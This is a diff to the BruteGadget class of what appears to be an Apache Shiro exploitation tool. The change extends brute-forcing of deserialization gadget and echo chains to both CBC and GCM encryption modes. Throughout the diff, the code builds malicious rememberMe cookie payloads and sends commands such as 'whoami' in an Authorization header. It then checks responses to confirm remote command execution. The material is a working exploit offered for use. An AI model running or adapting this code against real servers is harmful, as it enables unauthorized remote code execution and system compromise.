@@ -57,53 +57,113 @@ public class BruteGadget {
         // 遍历生成payload并验证
         for (String gadget : gadgets) {
             for (String echo : echos) {
-                try {
-                    Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);      // 反射获取利用链
-                    Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class);
-                    String payload = (String) method.invoke(null, echo, key);
+                // 获取加密模式
+                String cryptType = url.getCryptType();
 
-                    // 生成验证命令
-                    String checkString = Tools.generateRandomString(20);
-                    String command = "echo " + checkString;
+                // 判断是否需要尝试两种模式
+                boolean tryCBC = "爆破所有".equals(cryptType) || "CBC".equals(cryptType);
+                boolean tryGCM = "爆破所有".equals(cryptType) || "GCM".equals(cryptType);
 
-                    if (echo.equals("AllEcho")) {
-                        command = "whoami";
-                    }
+                // 尝试 CBC 模式
+                if (tryCBC) {
+                    try {
+                        Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
+                        Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
+                        String payload = (String) method.invoke(null, echo, key, "CBC");
 
-                    // 构造请求头
-                    Map<String, String> headers = new HashMap<>();
-                    headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
-                    headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));
+                        // 生成验证命令
+                        String checkString = Tools.generateRandomString(20);
+                        String command = "echo " + checkString;
 
-                    // 创建请求体（根据用户配置）
-                    RequestBody httpRequestBody = createRequestBody(url.getContentType(), url.getRequestBody());
-
-                    // 校验响应中是否存在
-                    ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, httpRequestBody, headers, url.getRequestType());
-                    String result1 = Tools.bytesToString(responseOBJ.getResponse());    // 原始response
-                    String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));   //提取result的base64
-                    result = Tools.bytesToString(Base64.getDecoder().decode(result));
-
-                    if (echo.equals("AllEcho")) {
-                        if (result1.contains("$$$")) {
-                            System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo));
-                            success_gadgets.add(gadget + "+" + echo);
-                        } else {
-                            System.out.println(Log.buffer_logging("FAIL", "回显链无效: " + gadget + " -> " + echo));
+                        if (echo.equals("AllEcho")) {
+                            command = "whoami";
                         }
-                    } else {
-                        if (result.contains(checkString)) {
-                            System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo));
-                            success_gadgets.add(gadget + "+" + echo);
+
+                        // 构造请求头
+                        Map<String, String> headers = new HashMap<>();
+                        headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
+                        headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));
+
+                        // 创建请求体（根据用户配置）
+                        RequestBody httpRequestBody = createRequestBody(url.getContentType(), url.getRequestBody());
+
+                        // 校验响应中是否存在
+                        ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, httpRequestBody, headers, url.getRequestType());
+                        String result1 = Tools.bytesToString(responseOBJ.getResponse());    // 原始response
+                        String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));   //提取result的base64
+                        result = Tools.bytesToString(Base64.getDecoder().decode(result));
+
+                        if (echo.equals("AllEcho")) {
+                            if (result1.contains("$$$")) {
+                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (CBC)"));
+                                success_gadgets.add(gadget + "+" + echo);
+                            }
                         } else {
-                            System.out.println(Log.buffer_logging("FAIL", "回显链无效: " + gadget + " -> " + echo));
+                            if (result.contains(checkString)) {
+                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (CBC)"));
+                                success_gadgets.add(gadget + "+" + echo);
+                            }
                         }
+                    } catch (IndexOutOfBoundsException e) {
+                        // CBC 模式失败，继续尝试
+                    } catch (Exception e){
+                        // CBC 模式异常，继续尝试
                     }
-                } catch (IndexOutOfBoundsException e) {
-                    System.out.println(Log.buffer_logging("FAIL", "回显链无效: " + gadget + " -> " + echo));
-                } catch (Exception e){
-                    String errorMsg = e.getMessage();
-                    System.out.println(Log.buffer_logging("EROR", errorMsg != null ? errorMsg : "回显链检测异常"));
+                }
+
+                // 尝试 GCM 模式
+                if (tryGCM) {
+                    try {
+                        Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
+                        Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
+                        String payload = (String) method.invoke(null, echo, key, "GCM");
+
+                        // 生成验证命令
+                        String checkString = Tools.generateRandomString(20);
+                        String command = "echo " + checkString;
+
+                        if (echo.equals("AllEcho")) {
+                            command = "whoami";
+                        }
+
+                        // 构造请求头
+                        Map<String, String> headers = new HashMap<>();
+                        headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
+                        headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));
+
+                        // 创建请求体（根据用户配置）
+                        RequestBody httpRequestBody = createRequestBody(url.getContentType(), url.getRequestBody());
+
+                        // 校验响应中是否存在
+                        ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, httpRequestBody, headers, url.getRequestType());
+                        String result1 = Tools.bytesToString(responseOBJ.getResponse());    // 原始response
+                        String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));   //提取result的base64
+                        result = Tools.bytesToString(Base64.getDecoder().decode(result));
+
+                        if (echo.equals("AllEcho")) {
+                            if (result1.contains("$$$")) {
+                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (GCM)"));
+                                // 避免重复添加（CBC 已成功的情况下）
+                                String comboKey = gadget + "+" + echo;
+                                if (!success_gadgets.contains(comboKey)) {
+                                    success_gadgets.add(comboKey);
+                                }
+                            }
+                        } else {
+                            if (result.contains(checkString)) {
+                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (GCM)"));
+                                // 避免重复添加（CBC 已成功的情况下）
+                                String comboKey = gadget + "+" + echo;
+                                if (!success_gadgets.contains(comboKey)) {
+                                    success_gadgets.add(comboKey);
+                                }
+                            }
+                        }
+                    } catch (IndexOutOfBoundsException e) {
+                        // GCM 模式失败，忽略
+                    } catch (Exception e){
+                        // GCM 模式异常，忽略
+                    }
                 }
             }
         }
@@ -146,75 +206,136 @@ public class BruteGadget {
         // 遍历生成payload并验证
         for (String gadget : gadgets) {
             for (String echo : echos) {
-                current++;
-                String progressMsg = String.format("[INFO]正在测试 [%d/%d]: %s + %s", current, total, gadget, echo);
-                if (callback != null) {
-                    callback.onProgress(progressMsg);
+                // 获取加密模式
+                String cryptType = url.getCryptType();
+
+                // 判断是否需要尝试两种模式
+                boolean tryCBC = "爆破所有".equals(cryptType) || "CBC".equals(cryptType);
+                boolean tryGCM = "爆破所有".equals(cryptType) || "GCM".equals(cryptType);
+
+                boolean cbcSuccess = false;
+                boolean gcmSuccess = false;
+
+                // 尝试 CBC 模式（独立测试，不影响 GCM）
+                if (tryCBC) {
+                    try {
+                        Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
+                        Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
+                        String payload = (String) method.invoke(null, echo, key, "CBC");
+
+                        // 生成验证命令
+                        String checkString = Tools.generateRandomString(20);
+                        String command = "echo " + checkString;
+
+                        if (echo.equals("AllEcho")) {
+                            command = "whoami";
+                        }
+
+                        // 构造请求头
+                        Map<String, String> headers = new HashMap<>();
+                        headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
+                        headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));
+
+                        // 创建请求体（根据用户配置）
+                        RequestBody httpRequestBody = createRequestBody(url.getContentType(), url.getRequestBody());
+
+                        // 校验响应中是否存在
+                        ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, httpRequestBody, headers, url.getRequestType());
+                        String result1 = Tools.bytesToString(responseOBJ.getResponse());
+                        String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));
+                        result = Tools.bytesToString(Base64.getDecoder().decode(result));
+
+                        if (echo.equals("AllEcho")) {
+                            if (result1.contains("$$$")) {
+                                cbcSuccess = true;
+                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (CBC)"));
+                                if (callback != null) {
+                                    callback.onSuccess(gadget, echo);
+                                }
+                                success_gadgets.add(gadget + "+" + echo);
+                            }
+                        } else {
+                            if (result.contains(checkString)) {
+                                cbcSuccess = true;
+                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (CBC)"));
+                                if (callback != null) {
+                                    callback.onSuccess(gadget, echo);
+                                }
+                                success_gadgets.add(gadget + "+" + echo);
+                            }
+                        }
+                    } catch (IndexOutOfBoundsException e) {
+                        // CBC 模式失败，继续尝试
+                    } catch (Exception e) {
+                        // CBC 模式异常，继续尝试
+                    }
                 }
-                System.out.println(Log.buffer_logging("INFO", "正在测试: " + gadget + " -> " + echo));
 
-                try {
-                    Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
-                    Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class);
-                    String payload = (String) method.invoke(null, echo, key);
+                // 尝试 GCM 模式（独立测试，与 CBC 无关）
+                if (tryGCM) {
+                    try {
+                        Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
+                        Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
+                        String payload = (String) method.invoke(null, echo, key, "GCM");
 
-                    // 生成验证命令
-                    String checkString = Tools.generateRandomString(20);
-                    String command = "echo " + checkString;
+                        // 生成验证命令
+                        String checkString = Tools.generateRandomString(20);
+                        String command = "echo " + checkString;
 
-                    if (echo.equals("AllEcho")) {
-                        command = "whoami";
-                    }
+                        if (echo.equals("AllEcho")) {
+                            command = "whoami";
+                        }
 
-                    // 构造请求头
-                    Map<String, String> headers = new HashMap<>();
-                    headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
-                    headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));
+                        // 构造请求头
+                        Map<String, String> headers = new HashMap<>();
+                        headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
+                        headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));
 
-                    // 创建请求体（根据用户配置）
-                    RequestBody httpRequestBody = createRequestBody(url.getContentType(), url.getRequestBody());
+                        // 创建请求体（根据用户配置）
+                        RequestBody httpRequestBody = createRequestBody(url.getContentType(), url.getRequestBody());
 
-                    // 校验响应中是否存在
-                    ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, httpRequestBody, headers, url.getRequestType());
-                    String result1 = Tools.bytesToString(responseOBJ.getResponse());
-                    String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));
-                    result = Tools.bytesToString(Base64.getDecoder().decode(result));
+                        // 校验响应中是否存在
+                        ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, httpRequestBody, headers, url.getRequestType());
+                        String result1 = Tools.bytesToString(responseOBJ.getResponse());
+                        String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));
+                        result = Tools.bytesToString(Base64.getDecoder().decode(result));
 
-                    if (echo.equals("AllEcho")) {
-                        if (result1.contains("$$$")) {
-                            String successMsg = "[SUCC]发现回显链: " + gadget + " -> " + echo;
-                            System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo));
-                            if (callback != null) {
-                                callback.onSuccess(gadget, echo);
+                        if (echo.equals("AllEcho")) {
+                            if (result1.contains("$$$")) {
+                                gcmSuccess = true;
+                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (GCM)"));
+                                if (callback != null) {
+                                    callback.onSuccess(gadget, echo);
+                                }
+                                // 避免重复添加
+                                String comboKey = gadget + "+" + echo;
+                                if (!success_gadgets.contains(comboKey)) {
+                                    success_gadgets.add(comboKey);
+                                }
                             }
-                            success_gadgets.add(gadget + "+" + echo);
                         } else {
-                            if (callback != null) {
-                                callback.onFail(gadget, echo);
+                            if (result.contains(checkString)) {
+                                gcmSuccess = true;
+                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (GCM)"));
+                                if (callback != null) {
+                                    callback.onSuccess(gadget, echo);
+                                }
+                                // 避免重复添加
+                                String comboKey = gadget + "+" + echo;
+                                if (!success_gadgets.contains(comboKey)) {
+                                    success_gadgets.add(comboKey);
+                                }
                             }
                         }
-                    } else {
-                        if (result.contains(checkString)) {
-                            String successMsg = "[SUCC]发现回显链: " + gadget + " -> " + echo;
-                            System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo));
-                            if (callback != null) {
-                                callback.onSuccess(gadget, echo);
-                            }
-                            success_gadgets.add(gadget + "+" + echo);
-                        } else {
-                            if (callback != null) {
-                                callback.onFail(gadget, echo);
-                            }
-                        }
+                    } catch (IndexOutOfBoundsException e) {
+                        // GCM 模式失败
+                    } catch (Exception e) {
+                        // GCM 模式异常
                     }
-                } catch (IndexOutOfBoundsException e) {
-                    System.out.println(Log.buffer_logging("FAIL", "回显链无效: " + gadget + " -> " + echo));
-                    if (callback != null) {
-                        callback.onFail(gadget, echo);
-                    }
-                } catch (Exception e) {
-                    String errorMsg = e.getMessage();
-                    System.out.println(Log.buffer_logging("EROR", errorMsg != null ? errorMsg : "回显链检测异常"));
+                }
+
+                // 如果两种模式都失败，回调失败
+                if (!cbcSuccess && !gcmSuccess) {
                     if (callback != null) {
                         callback.onFail(gadget, echo);
                     }
@@ -274,68 +395,136 @@ public class BruteGadget {
                 }
                 System.out.println(Log.buffer_logging("INFO", "正在测试: " + gadget + " -> " + echo));
 
-                try {
-                    Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
-                    Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class);
-                    String payload = (String) method.invoke(null, echo, key);
+                // 获取加密模式
+                String cryptType = url.getCryptType();
 
-                    // 生成验证命令
-                    String checkString = Tools.generateRandomString(20);
-                    String command = "echo " + checkString;
+                // 判断是否需要尝试两种模式
+                boolean tryCBC = "爆破所有".equals(cryptType) || "CBC".equals(cryptType);
+                boolean tryGCM = "爆破所有".equals(cryptType) || "GCM".equals(cryptType);
 
-                    if (echo.equals("AllEcho")) {
-                        command = "whoami";
-                    }
+                boolean cbcSuccess = false;
+                boolean gcmSuccess = false;
 
-                    // 构造请求头
-                    Map<String, String> headers = new HashMap<>();
-                    headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
-                    headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));
+                // 尝试 CBC 模式（独立测试，不影响 GCM）
+                if (tryCBC) {
+                    try {
+                        Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
+                        Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
+                        String payload = (String) method.invoke(null, echo, key, "CBC");
 
-                    // 创建请求体（根据用户配置）
-                    RequestBody httpRequestBody = createRequestBody(url.getContentType(), url.getRequestBody());
+                        // 生成验证命令
+                        String checkString = Tools.generateRandomString(20);
+                        String command = "echo " + checkString;
 
-                    // 校验响应中是否存在
-                    ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, httpRequestBody, headers, url.getRequestType());
-                    String result1 = Tools.bytesToString(responseOBJ.getResponse());
-                    String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));
-                    result = Tools.bytesToString(Base64.getDecoder().decode(result));
+                        if (echo.equals("AllEcho")) {
+                            command = "whoami";
+                        }
 
-                    if (echo.equals("AllEcho")) {
-                        if (result1.contains("$$$")) {
-                            String successMsg = "[SUCC]发现回显链: " + gadget + " -> " + echo;
-                            System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo));
-                            if (callback != null) {
-                                callback.onSuccess(gadget, echo);
+                        // 构造请求头
+                        Map<String, String> headers = new HashMap<>();
+                        headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
+                        headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));
+
+                        // 创建请求体（根据用户配置）
+                        RequestBody httpRequestBody = createRequestBody(url.getContentType(), url.getRequestBody());
+
+                        // 校验响应中是否存在
+                        ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, httpRequestBody, headers, url.getRequestType());
+                        String result1 = Tools.bytesToString(responseOBJ.getResponse());
+                        String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));
+                        result = Tools.bytesToString(Base64.getDecoder().decode(result));
+
+                        if (echo.equals("AllEcho")) {
+                            if (result1.contains("$$$")) {
+                                cbcSuccess = true;
+                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (CBC)"));
+                                if (callback != null) {
+                                    callback.onSuccess(gadget, echo);
+                                }
+                                success_gadgets.add(gadget + "+" + echo);
                             }
-                            success_gadgets.add(gadget + "+" + echo);
                         } else {
-                            if (callback != null) {
-                                callback.onFail(gadget, echo);
+                            if (result.contains(checkString)) {
+                                cbcSuccess = true;
+                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (CBC)"));
+                                if (callback != null) {
+                                    callback.onSuccess(gadget, echo);
+                                }
+                                success_gadgets.add(gadget + "+" + echo);
                             }
                         }
-                    } else {
-                        if (result.contains(checkString)) {
-                            String successMsg = "[SUCC]发现回显链: " + gadget + " -> " + echo;
-                            System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo));
-                            if (callback != null) {
-                                callback.onSuccess(gadget, echo);
+                    } catch (IndexOutOfBoundsException e) {
+                        // CBC 模式失败，继续尝试
+                    } catch (Exception e) {
+                        // CBC 模式异常，继续尝试
+                    }
+                }
+
+                // 尝试 GCM 模式（独立测试，与 CBC 无关）
+                if (tryGCM) {
+                    try {
+                        Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);
+                        Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class, String.class, String.class);
+                        String payload = (String) method.invoke(null, echo, key, "GCM");
+
+                        // 生成验证命令
+                        String checkString = Tools.generateRandomString(20);
+                        String command = "echo " + checkString;
+
+                        if (echo.equals("AllEcho")) {
+                            command = "whoami";
+                        }
+
+                        // 构造请求头
+                        Map<String, String> headers = new HashMap<>();
+                        headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
+                        headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));
+
+                        // 创建请求体（根据用户配置）
+                        RequestBody httpRequestBody = createRequestBody(url.getContentType(), url.getRequestBody());
+
+                        // 校验响应中是否存在
+                        ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, httpRequestBody, headers, url.getRequestType());
+                        String result1 = Tools.bytesToString(responseOBJ.getResponse());
+                        String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));
+                        result = Tools.bytesToString(Base64.getDecoder().decode(result));
+
+                        if (echo.equals("AllEcho")) {
+                            if (result1.contains("$$$")) {
+                                gcmSuccess = true;
+                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (GCM)"));
+                                if (callback != null) {
+                                    callback.onSuccess(gadget, echo);
+                                }
+                                // 避免重复添加
+                                String comboKey = gadget + "+" + echo;
+                                if (!success_gadgets.contains(comboKey)) {
+                                    success_gadgets.add(comboKey);
+                                }
                             }
-                            success_gadgets.add(gadget + "+" + echo);
                         } else {
-                            if (callback != null) {
-                                callback.onFail(gadget, echo);
+                            if (result.contains(checkString)) {
+                                gcmSuccess = true;
+                                System.out.println(Log.buffer_logging("SUCC", "发现回显链: " + gadget + " -> " + echo + " (GCM)"));
+                                if (callback != null) {
+                                    callback.onSuccess(gadget, echo);
+                                }
+                                // 避免重复添加
+                                String comboKey = gadget + "+" + echo;
+                                if (!success_gadgets.contains(comboKey)) {
+                                    success_gadgets.add(comboKey);
+                                }
                             }
                         }
+                    } catch (IndexOutOfBoundsException e) {
+                        // GCM 模式失败
+                    } catch (Exception e) {
+                        // GCM 模式异常
                     }
-                } catch (IndexOutOfBoundsException e) {
-                    System.out.println(Log.buffer_logging("FAIL", "回显链无效: " + gadget + " -> " + echo));
-                    if (callback != null) {
-                        callback.onFail(gadget, echo);
-                    }
-                } catch (Exception e) {
-                    String errorMsg = e.getMessage();
-                    System.out.println(Log.buffer_logging("EROR", errorMsg != null ? errorMsg : "回显链检测异常"));
+                }
+
+                // 如果两种模式都失败，回调失败
+                if (!cbcSuccess && !gcmSuccess) {
                     if (callback != null) {
                         callback.onFail(gadget, echo);
                     }
